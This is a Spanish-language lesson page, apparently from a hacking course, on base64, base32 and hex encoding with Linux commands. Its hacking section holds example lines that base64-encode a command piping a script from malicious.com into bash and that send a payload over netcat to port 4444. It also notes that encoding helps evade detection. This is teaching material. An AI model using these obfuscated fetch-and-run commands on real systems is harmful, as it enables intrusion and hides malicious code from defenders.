Codificación y decodificación en base64

Duración: 3:42 · Sección 2: Temario

Base64 es un sistema de codificación que convierte datos binarios en texto ASCII usando 64 caracteres (A-Z, a-z, 0-9, +, /). Es ubicuo en la web moderna: emails (MIME), autenticación HTTP, JWT, y ofuscación en malware.

Codificar y decodificar con base64

En Linux, el comando base64 hace ambas operaciones de forma directa.

# Codificar un texto
echo "Hack4u" | base64
# Salida: SGFjazR1Cg==

# Decodificar
echo "SGFjazR1Cg==" | base64 -d

# Codificar un archivo
base64 imagen.png > imagen.b64

# Decodificar a archivo
base64 -d imagen.b64 > imagen_recuperada.png
🧠 ¿Por qué "base64"? Porque usa 2⁶ = 64 caracteres. Cada carácter representa 6 bits. Para codificar 3 bytes (24 bits) se necesitan 4 caracteres base64 (4 × 6 = 24 bits). Si los datos no son múltiplo de 3, se añade padding con =.

Comparativa: base64 vs base32 vs hex

Codificación Alfabeto Eficiencia Uso típico
base64 A-Z a-z 0-9 + / 75% (3 bytes → 4 chars) Web, JWT, MIME
base32 A-Z 2-7 62.5% Claves compartidas (OTP)
hex (base16) 0-9 a-f 50% (1 byte → 2 chars) Hashing, debugging 
# Codificar en base32
echo "Hack4u" | base32

# Codificar en hex
echo "Hack4u" | xxd -p

# Decodificar hex a texto
echo "4861636b3475" | xxd -r -p

Aplicaciones en hacking

Base64 se usa frecuentemente en ciberseguridad para:

  • Ofuscación de payloads: Malware que codifica sus cadenas en base64 para evadir detección estática
  • Transferencia de binarios: Pasar un binario por un canal que solo soporta texto (HTTP, DNS)
  • Reverse shell: Codificar comandos para evasión
  • JWT: Los tokens JWT usan base64 URL-safe (reemplaza +/ por -_)
# Decodificar JWT manualmente (primer segmento = header)
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null

# Ofuscar un comando
echo "curl http://malicious.com/payload.sh | bash" | base64

# Transferir un binario por TCP
base64 -w0 payload.exe | nc 192.168.1.10 4444
⚠️ Importante: base64 no es cifrado. Cualquiera puede decodificarlo instantáneamente. Es codificación, no encriptación. No lo uses para proteger datos sensibles.
